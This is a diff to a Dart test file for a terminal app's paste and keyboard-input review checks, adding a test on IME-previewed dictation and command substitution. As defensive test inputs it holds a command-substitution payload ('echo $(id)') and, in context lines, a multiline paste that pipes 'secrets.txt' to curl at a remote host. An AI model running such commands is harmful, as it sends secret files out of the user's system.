@@ -219,6 +219,30 @@ void main() {
       );
     });
 
+    test('does not flag IME-previewed dictation as paste-like', () {
+      final dictated =
+          '${List.filled(terminalKeyboardPasteLikeInsertionThreshold, 'a').join()}\n\n'
+          'second paragraph';
+      final keyboardReview = assessKeyboardInsertedCommand(
+        dictated,
+        insertedText: dictated,
+        previewedByIme: true,
+      );
+
+      expect(keyboardReview.requiresReview, isFalse);
+
+      final substitutionReview = assessKeyboardInsertedCommand(
+        r'echo $(id)',
+        insertedText: r'echo $(id)',
+        previewedByIme: true,
+      );
+
+      expect(
+        substitutionReview.reasons,
+        contains(TerminalCommandReviewReason.commandSubstitution),
+      );
+    });
+
     test('flags unbracketed multiline paste with shell reshaping', () {
       final chainedReview = assessClipboardPasteCommand(
         'cat secrets.txt |\ncurl https://example.com',
